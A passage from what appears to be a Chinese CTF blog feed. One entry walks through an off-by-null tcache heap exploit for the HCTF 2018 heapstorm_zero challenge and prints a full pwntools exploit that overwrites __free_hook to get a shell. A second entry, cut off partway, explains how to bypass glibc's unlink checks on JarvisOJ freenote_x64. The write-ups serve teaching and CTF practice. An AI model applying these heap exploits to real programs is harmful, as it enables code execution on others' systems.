个 chunk , 所以可以先填满 7 个 chunk 到 tcache 后续的 chunk 就会进入 unsorted bin 里面了。</p><p>首先分配 10 个 chunk , 释放掉后面 7 个这7 个进入 tcache , 然后释放 前面 3 个，这3 个会进入 unsorted bin , 这个过程会在 chunk 2 的 pre_size 写入 0x200.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局为</p><p><img alt="" data-src="/imgs/off-by-null-12.png" class="lozad"></p><p>接下来利用 off by null 构造 overlap chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先 释放 chunk 7 , 它会进入 unsorted bin， 设它为 C .</li><li>然后分配一个 chunk 0, 消耗一个 tcache, 为后面做准备。</li><li>然后释放 chunk 8 , 此时 tcache 还有一个空位，会进入 tcache 设它为 B. 再次分配 chunk ,此时会再次拿到 刚刚释放的 B ,保存在 索引 1 （以后称它为 chunk 1）的位置， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</li><li>然后释放 chunk 9 , 由于 pre_size 和 pre_inused ，系统会找到 C , 然后把 C unlink , 由于此时 C 在 unsorted bin 链表上，会 正常 unlink , 之后形成一个 0x300 的 unsorted bin , 里面包含了 还在使用状态的 B</li></ul><p><img alt="" data-src="/imgs/off-by-null-13.png" class="lozad"></p><p>下面利用 unsorted bin 的切割机制，让指针落入 chunk 1 ， 然后利用 Puts 打印出来， leak libc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 把剩下的 tcache 里面的 bin 消耗掉</span><br><span class="line">for i in range(7):</span><br><span class="line">    malloc(8, &apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span><br><span class="line">malloc(1, &apos;8&apos;)</span><br></pre></td></tr></table></figure><p>首先把 tcache 使用掉，然后分配一个 chunk ,此时 chunk 1 会变成 unsorted bin 的起始地址。</p><p>然后打印 chunk 1 的内容，拿到 libc 的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br></pre></td></tr></table></figure></p><p>下面利用 tcache 的机制, 让两个 一样的 bin 链入 tcache ，为后续做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分配到 chunk 1, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># 为了给后续申请腾出空间</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先分配一 个 chunk , 这时 索引 1， 9 指向同一个 chunk，设这个 chunk 的名称为 A。</li><li>然后连续释放 1 和 9 ， 此时 tcache 里面会有两个 A .</li></ul><p><img alt="" data-src="/imgs/off-by-null-14.png" class="lozad"></p><p>然后在通过修改 tcache 的指针实现分配到 __free_hook, 修改 free_hook 为 one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-15.png" class="lozad"><br>最后触发 free , 调用 one_gadget ，拿到 shell.</p><p>完整exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">"easy_heap"</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">bin = ELF(path)</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64((p.recvline()[:<span class="number">-1</span>]).ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 tcache 分配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配 unsorted bin</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'7'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次让 chunk 回到 tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把剩下的 tcache 里面的 bin 消耗掉</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">8</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 chunk 8, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0xe42ee</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 free_hook</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>参考<br><a href="https://www.cnblogs.com/hac425/p/9993716.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9993716.html</a><br><a href="https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py</a><br><a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。&lt;/p&gt;
&lt;p&gt;题目
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="https://nocbtm.github.io/2020/02/27/unlink/"/>
    <id>https://nocbtm.github.io/2020/02/27/unlink/</id>
    <published>2020-02-27T06:38:52.000Z</published>
    <updated>2020-04-08T14:04:21.111Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个smallchunk的时候，如果它前面或者后面的chunk有空闲的，即in_use位为0时，就将前面或后面的chunk连在一起合成一个chunk;<br>smallbin的数据结构：prev_size,size,fd,bk;<br>因为smallbin被释放后是用双链串在一起的，这就使目前unlink操作时，有一定的检查机制，主要检查我们的双链是否是合法的；<br>主要检查fd,bk等指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure></p><p>在双向链表中，所以有两个地方记录chunk的大小，所以检查一下其大小是否一致：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure><p>unlink操作的简要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)</span></span><br><span class="line">&#123;</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span>(FD-&gt;bk != P || BK-&gt;fd !=p)</span><br><span class="line">    &#123;</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted d..."</span>, P);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>实际上，我们还是有办法绕过unlink的检查，不过需要有一些条件：</p><ol><li>有一个指向heap内的指针；</li><li>存放这个指针的地址已知(一般这个地址(&amp;p)是全局变量)；</li><li>可以对这个指针进行多次写入；</li><li>然后我们想办法修改p的fd和p的bk分别为:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">0x18</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">0x10</span>; <span class="comment">//bk</span></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">12</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">8</span>; <span class="comment">//bk</span></span><br></pre></td></tr></table></figure><p>这样我们就可以绕过(FD-&gt;bk != P || BK-&gt;fd !=p)检测了，当unlink的操作完了之后，我们得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p = &amp;p - <span class="number">0x18</span>；</span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p = &amp;p - <span class="number">12</span>;</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们以JarvisOJ中的freenote_x64来具体演示一下绕过unlink的操作并且熟悉一下smallbin的结构；<br>这道题在add函数和edit函数中，真实malloc的size最小都是0x80，也就是我们申请的是smallbin,所以操作的也是samllbin；<br>主要漏洞在delete note里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_list-&gt;number &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No posts yet."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Post number: "</span>);</span><br><span class="line">    i = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt; chunk_list-&gt;sum )        <span class="comment">// 未检查inuse位，double_free</span></span><br><span class="line">    &#123;</span><br><span class="line">      --chunk_list-&gt;number;</span><br><span class="line">      chunk_list-&gt;block[i].in_use = <span class="number">0L</span>L;</span><br><span class="line">      chunk_list-&gt;block[i].len = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(chunk_list-&gt;block[i].ptr);           <span class="comment">// 指针未清空</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个有用的漏洞就是add和edit时，我们输入的字符串没有‘\x00’结尾符，我们输入多大的size就读多少size的字符，没有多余；</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>所以基本思路就是我们先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;<br>在heap基地址偏移0x30的地方有我们需要的&amp;p:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000001 0x0000000000000004</span><br><span class="line">0x603030:&amp;p0x0000000000604830 p 0x0000000000000001</span><br><span class="line">0x603040:0x0000000000000002 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>有了&amp;p之后我们就可以构造chunk，然后unlink了；<br>unlink之后的&amp;p,此时p=&amp;p-0x18:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603030:0x0000000000603018 p 0x0000000000000001 //p=&amp;p-0x18</span><br><span class="line">0x603040:0x0000000000000008 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后现在我们就可以修改0x0603018地址开始的内容了，然后就可以修改指针达到任意地址写入了；</p><h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>伪造的如下三个堆块结构 ，注意chunk前后的size一定要相对应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x17b8820</span><br><span class="line">0x17b8820:0x00000000000000000x0000000000000191</span><br><span class="line">0x17b8830:0x00000000000000900x0000000000000081</span><br><span class="line">0x17b8840:0x00000000017b70180x00000000017b7020</span><br><span class="line">0x17b8850:0x61616161616161610x6161616161616161</span><br><span 